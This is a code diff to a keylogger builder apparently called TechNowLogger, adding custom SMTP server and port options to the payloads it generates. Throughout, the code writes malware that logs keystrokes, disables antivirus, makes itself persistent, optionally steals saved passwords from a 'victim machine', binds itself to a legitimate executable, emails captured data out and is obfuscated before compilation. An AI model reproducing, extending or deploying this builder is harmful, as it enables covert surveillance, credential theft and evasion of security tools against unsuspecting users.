@@ -20,7 +20,7 @@ elif platform.system() == 'Linux':
     WINDOWS_PYTHON_PYINSTALLER_PATH = "wine ~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe"
 
 def get_arguments():
-    parser = argparse.ArgumentParser(description=f'{Fore.RED}TechNowLogger v2.0')
+    parser = argparse.ArgumentParser(description=f'{Fore.RED}TechNowLogger v2.1')
     parser._optionals.title = f"{Fore.GREEN}Optional Arguments{Fore.YELLOW}"
     parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds. default=120", default=120)
     parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10)    
@@ -29,6 +29,8 @@ def get_arguments():
     parser.add_argument("-s", "--steal-password", dest="stealer", help=f"Steal Saved Password from Victim Machine [{Fore.RED}Supported OS : Windows{Fore.YELLOW}]", action='store_true')
     parser.add_argument("-b", "--bind", dest="bind", help="AutoBinder : Specify Path of Legitimate file.")
     parser.add_argument("-d", "--debug", dest="debug", help="Payload Will Run In Foreground with CMD Window, To get Appropriate Execution Error", action='store_true')
+    parser.add_argument("-x", "--smtp", dest="smtp_server", help="Enter custom email smtp server. default=smtp.google.com", default="smtp.google.com")
+    parser.add_argument("-y", "--port", dest="smtp_port", help="Enter custom email smtp port. default=587", default=587)
     
     
     required_arguments = parser.add_argument_group(f'{Fore.RED}Required Arguments{Fore.GREEN}')
@@ -102,7 +104,7 @@ def check_dependencies():
             print(f"{Fore.YELLOW}[ X ] Try to Install Python 3.7.4")
             quit()        
 
-def create_keylogger(file_name, interval, email, password, time_persistent):
+def create_keylogger(file_name, interval, email, password, time_persistent, smtp_server, smtp_port):
     with open(file_name, "w+") as file:
         file.write("import keylogger, win32event, winerror, win32api\n")
         if arguments.stealer:
@@ -130,14 +132,14 @@ def create_keylogger(file_name, interval, email, password, time_persistent):
         if arguments.stealer:
             file.write(f"\t\tt1 = threading.Thread(target=steal)\n")    #Making Stealer Thread  
             file.write(f"\t\tt1.start()\n\n")                           #Starting Thread
-        file.write(f"\t\ttechnowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\')\n")        
+        file.write(f"\t\ttechnowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\', \'{smtp_server}\', \'{smtp_port}\')\n")        
         file.write("\t\ttechnowlogger.kill_av()\n")        
         file.write(f"\t\ttechnowlogger.become_persistent({time_persistent})\n")
         file.write("\t\ttechnowlogger.start()\n\n")       
         
         file.write("check_and_start()\n")      #Running/Calling the Functions   
 
-def create_keylogger_binded(file_name, interval, email, password, time_persistent, legitimate_file):
+def create_keylogger_binded(file_name, interval, email, password, time_persistent, legitimate_file, smtp_server, smtp_port):
     with open(file_name, "w+") as file:
         file.write("import keylogger, sys, subprocess, win32event, winerror, win32api, threading\n")
         if arguments.stealer:
@@ -175,17 +177,17 @@ def create_keylogger_binded(file_name, interval, email, password, time_persisten
             file.write(f"\t\tt2 = threading.Thread(target=steal)\n")    #Making Stealer Thread  
             file.write(f"\t\tt2.start()\n\n")                           #Starting Thread
 
-        file.write(f"\t\ttechnowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\')\n")        
+        file.write(f"\t\ttechnowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\', \'{smtp_server}\', \'{smtp_port}\')\n")        
         file.write("\t\ttechnowlogger.kill_av()\n")        
         file.write(f"\t\ttechnowlogger.become_persistent({time_persistent})\n")
         file.write("\t\ttechnowlogger.start()\n\n")            
         file.write("check_and_start()\n") 
 
-def create_keylogger_linux(file_name, interval, email, password, time_persistent):
+def create_keylogger_linux(file_name, interval, email, password, time_persistent, smtp_server, smtp_port):
     with open(file_name, "w+") as file:
         file.write("import keylogger\n")
 
-        file.write(f"technowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\')\n")        
+        file.write(f"technowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\', \'{smtp_server}\', \'{smtp_port}\')\n")        
         file.write("technowlogger.kill_av()\n")        
         file.write(f"technowlogger.become_persistent({time_persistent})\n")
         file.write("technowlogger.start()\n")     
@@ -287,7 +289,9 @@ if __name__ == '__main__':
         print(f'   {Fore.YELLOW}Output Evil File Name:{Fore.RED} ' + arguments.out) 
         print(f'   {Fore.YELLOW}Icon Path:{Fore.RED} ' + arguments.icon)
         print(f'   {Fore.YELLOW}Pyinstaller Path:{Fore.RED} ' + WINDOWS_PYTHON_PYINSTALLER_PATH + f" {Fore.YELLOW}[{Fore.WHITE}Manually Update line: 19 & 22, If this PATH is Incorrect{Fore.YELLOW}]")
-        
+        print(f'   {Fore.YELLOW}SMTP Server{Fore.RED} ' + arguments.smtp_server) 
+        print(f'   {Fore.YELLOW}SMTP Port{Fore.RED} ' + str(arguments.smtp_port)) 
+
         if arguments.bind != None:
             print(f'   {Fore.YELLOW}Binding To [{Fore.RED}Legitimate File Path{Fore.YELLOW}]:{Fore.RED} ' + str(arguments.bind))
             
@@ -306,18 +310,20 @@ if __name__ == '__main__':
             arguments.icon = input(f'[?] Icon Path [{Fore.RED}If Present In This Directory, then just type Name{Fore.WHITE}]: ')  
             if arguments.bind != None:
                 arguments.bind = input(f'[?] Path of Legitimate File [{Fore.RED}.exe is Recommended{Fore.WHITE}]: ')
-
+            arguments.smtp_server = input('\n[?] Type your smtp server: ')
+            arguments.smtp_port = int(input('\n[?] Type your smtp port: '))
+            
         check_dependencies()
 
         print(f"\n{Fore.YELLOW}[*] Generating Please wait for a while...{Fore.MAGENTA}\n")
 
         if arguments.windows:
             if arguments.bind == '' or arguments.bind == None:
-                create_keylogger(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent))
+                create_keylogger(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent), arguments.smtp_server, int(arguments.smtp_port))
             else:
-                create_keylogger_binded(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent), arguments.bind.split("\\")[-1])            
+                create_keylogger_binded(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent), arguments.bind.split("\\")[-1], arguments.smtp_server, int(arguments.smtp_port))            
         else:
-            create_keylogger_linux(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent))            
+            create_keylogger_linux(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent), arguments.smtp_server, int(arguments.smtp_port))            
         
         obfuscating_payload(arguments.out)
         
